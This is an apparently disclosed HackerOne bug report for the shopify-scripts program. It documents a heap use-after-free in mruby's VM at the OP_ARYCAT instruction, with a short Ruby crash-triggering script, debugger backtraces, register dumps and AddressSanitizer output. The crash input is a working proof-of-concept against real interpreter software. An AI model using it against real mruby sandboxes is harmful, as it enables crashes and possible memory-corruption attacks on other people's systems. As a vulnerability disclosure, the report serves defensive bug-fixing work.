# Read after free in mrb_vm_exec with OP_ARYCAT reading R(B)

## Report Details
- **Report ID**: 184715
- **URL**: https://hackerone.com/reports/184715
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-11-24T05:13:55.083Z
- **Disclosed**: 2016-12-18T13:21:03.938Z

## Reporter
- **Username**: haquaman
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Hi,

Slightly different one, this is a use after free (as reported by an ASAN compiled binary). This one *doesn't* affect mruby-engine with the current instruction limit and memory limit, but if they are increased then it does.

The file is:

```
class Klazz
  def $thing.name
    f@thing.f@thing.name *nil
  end
  f$thing.name
end
```

```
$ ./dev/bin/mruby --version
mruby 1.2.0 (2015-11-17)
```

```
$ ./dev/bin/mruby crash.rb
crash.rb:3:22: '*' interpreted as argument prefix
Segmentation fault: 11
```

```
$ lldb ./dev/bin/mruby crash.rb
(lldb) target create "./dev/bin/mruby"
Current executable set to './dev/bin/mruby' (x86_64).
(lldb) settings set -- target.run-args  "crash.rb"
(lldb) r
Process 36164 launched: './dev/bin/mruby' (x86_64)
crash.rb:3:22: '*' interpreted as argument prefix
Process 36164 stopped
* thread #1: tid = 0x658c922, 0x000000010004261f mruby`mrb_vm_exec + 25407, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x1001fffc0)
    frame #0: 0x000000010004261f mruby`mrb_vm_exec + 25407
mruby`mrb_vm_exec:
->  0x10004261f <+25407>: movq   (%rax), %rsi
    0x100042622 <+25410>: movl   0x8(%rax), %edx
    0x100042625 <+25413>: movq   -0x6b8(%rbp), %rcx
    0x10004262c <+25420>: movl   -0x6b0(%rbp), %r8d
(lldb) bt
* thread #1: tid = 0x658c922, 0x000000010004261f mruby`mrb_vm_exec + 25407, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x1001fffc0)
  * frame #0: 0x000000010004261f mruby`mrb_vm_exec + 25407
    frame #1: 0x000000010003c2c7 mruby`mrb_vm_run + 135
    frame #2: 0x00000001000446b4 mruby`mrb_top_run + 100
    frame #3: 0x000000010006f19f mruby`load_exec + 1183
    frame #4: 0x000000010006ece3 mruby`mrb_load_file_cxt + 67
    frame #5: 0x0000000100000d78 mruby`main + 904
    frame #6: 0x00007fff8a9db5ad libdyld.dylib`start + 1
    frame #7: 0x00007fff8a9db5ad libdyld.dylib`start + 1
(lldb) register read
General Purpose Registers:
       rax = 0x00000001001fffc0
       rbx = 0x0000000000000000
       rcx = 0x0000000000000003
       rdx = 0x000000000000000e
       rdi = 0x4600441232bbc5a0
       rsi = 0x00007fff7cda1070  __stack_chk_guard
       rbp = 0x00007fff5fbfd670
       rsp = 0x00007fff5fbfca40
        r8 = 0x0000000000000100
        r9 = 0x000000000000010e
       r10 = 0x0000000000000000
       r11 = 0x00000000007a06a0
       r12 = 0x0000000000000000
       r13 = 0x0000000000000000
       r14 = 0x0000000000000000
       r15 = 0x0000000000000000
       rip = 0x000000010004261f  mruby`mrb_vm_exec + 25407
    rflags = 0x0000000000010206
        cs = 0x000000000000002b
        fs = 0x0000000000000000
        gs = 0x0000000000000000

(lldb) q
Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y
```

One with some symbols compiled in:

```
$ lldb ./bin/mruby ./crash.rb
(lldb) target create "./bin/mruby"
Current executable set to './bin/mruby' (x86_64).
(lldb) settings set -- target.run-args  "./crash.rb"
(lldb) r
Process 56454 launched: './bin/mruby' (x86_64)
../crash.rb:3:22: '*' interpreted as argument prefix
Process 56454 stopped
* thread #1: tid = 0x6591a7c, 0x000000010004437f mruby`mrb_vm_exec(mrb=0x0000000100300390, proc=0x0000000101004ee0, pc=0x000000010030f4d8) + 25407 at vm.c:2137, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x1001fffc0)
    frame #0: 0x000000010004437f mruby`mrb_vm_exec(mrb=0x0000000100300390, proc=0x0000000101004ee0, pc=0x000000010030f4d8) + 25407 at vm.c:2137
   2134
   2135     CASE(OP_ARYCAT) {
   2136       /* A B            mrb_ary_concat(R(A),R(B)) */
-> 2137       mrb_ary_concat(mrb, regs[GETARG_A(i)],
   2138                      mrb_ary_splat(mrb, regs[GETARG_B(i)]));
   2139       ARENA_RESTORE(mrb, ai);
   2140       NEXT;
(lldb) 
```

On a linux system with ASAN compiled:

```
crash.rb:3:22: '*' interpreted as argument prefix
=================================================================
==4694==ERROR: AddressSanitizer: heap-use-after-free on address 0x61d00001e840 at pc 0x00000050f129 bp 0x7ffcfbabee30 sp 0x7ffcfbabee28
READ of size 8 at 0x61d00001e840 thread T0
    #0 0x50f128 in mrb_vm_exec /root/mruby/src/vm.c:2137:7
    #1 0x510d28 in mrb_vm_run /root/mruby/src/vm.c:766:10
    #2 0x510d28 in mrb_top_run /root/mruby/src/vm.c:2452
    #3 0x5bda14 in load_exec /root/mruby/mrbgems/mruby-compiler/core/parse.y:5716:7
    #4 0x4e4211 in main /root/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:226:9
    #5 0x7efd15fe6ec4 in __libc_start_main /build/eglibc-3GlaMS/eglibc-2.19/csu/libc-start.c:287
    #6 0x43d146 in _start (/root/mruby/bin/mruby+0x43d146)

0x61d00001e840 is located 1984 bytes inside of 2048-byte region [0x61d00001e080,0x61d00001e880)
freed by thread T0 here:
    #0 0x4c4445 in realloc (/root/mruby/bin/mruby+0x4c4445)
    #1 0x517e6d in mrb_default_allocf /root/mruby/src/state.c:60:12

previously allocated by thread T0 here:
    #0 0x4c4445 in realloc (/root/mruby/bin/mruby+0x4c4445)
    #1 0x517e6d in mrb_default_allocf /root/mruby/src/state.c:60:12

SUMMARY: AddressSanitizer: heap-use-after-free /root/mruby/src/vm.c:2137 mrb_vm_exec
Shadow bytes around the buggy address:
  0x0c3a7fffbcb0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3a7fffbcc0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3a7fffbcd0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3a7fffbce0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3a7fffbcf0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x0c3a7fffbd00: fd fd fd fd fd fd fd fd[fd]fd fd fd fd fd fd fd
  0x0c3a7fffbd10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fffbd20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fffbd30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fffbd40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fffbd50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==4694==ABORTING
```

Now this affects mruby-engine *ONLY IF* the resource limits are increased. I increased `REASONABLE_MEMORY_QUOTA` from `4MB` to `22MB`, and `REASONABLE_INSTRUCTION_QUOTA` from `100,000` to `525,000`. This then crashes:

```
./bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000027
ruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin15]

-- Crash Report log information --------------------------------------------
   See Crash Report log file under the one of following:
     * ~/Library/Logs/CrashReporter
     * /Library/Logs/CrashReporter
     * ~/Library/Logs/DiagnosticReports
     * /Library/Logs/DiagnosticReports
   for more details.
Don't forget to include the above Crash Report log file in bug reports.

-- Control frame information -----------------------------------------------
c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
c:0002 p:0201 s:0005 E:0016a8 EVAL   ./bin/sandbox:20 [FINISH]
c:0001 p:0000 s:0002 E:001880 (none) [FINISH]

-- Ruby level backtrace information ----------------------------------------
./bin/sandbox:20:in `<main>'
./bin/sandbox:20:in `sandbox_eval'

-- Machine register context ------------------------------------------------
 rax: 0x000000010eb18450 rbx: 0x0000000000000050 rcx: 0x0000000000000042
 rdx: 0x00000001100dac60 rdi: 0x000000010eb10440 rsi: 0x000000010eb75d08
 rbp: 0x00007fff51b3c1f0 rsp: 0x00007fff51b3c180  r8: 0x0000000000000004
  r9: 0x0000000000000000 r10: 0x0000000000000000 r11: 0x000000000000020e
 r12: 0x000000010f332f40 r13: 0x000000000000001f r14: 0x0000000000000001
 r15: 0x000000010eb75d08 rip: 0x000000010e9f2683 rfl: 0x0000000000010213

-- C level backtrace information -------------------------------------------
0   ruby                                0x000000010e2605d4 rb_vm_bugreport + 388
1   ruby                                0x000000010e102023 rb_bug_context + 483
2   ruby                                0x000000010e1d5653 sigsegv + 83
3   libsystem_platform.dylib            0x00007fff9826d52a _sigtramp + 26
4   mruby_engine.bundle                 0x000000010e9f2683 each_backtrace + 211
5   ???                                 0x000000010eb70620 0x0 + 4541842976

-- Other runtime information -----------------------------------------------

* Loaded script: ./bin/sandbox

* Loaded features:

    0 enumerator.so
    1 thread.rb
    2 rational.so
    3 complex.so
<snip various gems>
  185 /Users/<snip>/mruby-engine/lib/mruby_engine/mruby_engine.bundle
  186 /Users/<snip>/mruby-engine/lib/mruby_engine.rb

[NOTE]
You may have encountered a bug in the Ruby interpreter or extension libraries.
Bug reports are welcome.
For details: http://www.ruby-lang.org/bugreport.html

```

I'm not sure on a patch for this off the top of my head, but I'll think of one in the next day or so if you don't get to it first :).

Cheers,

Hugh

## Attachments
No attachments
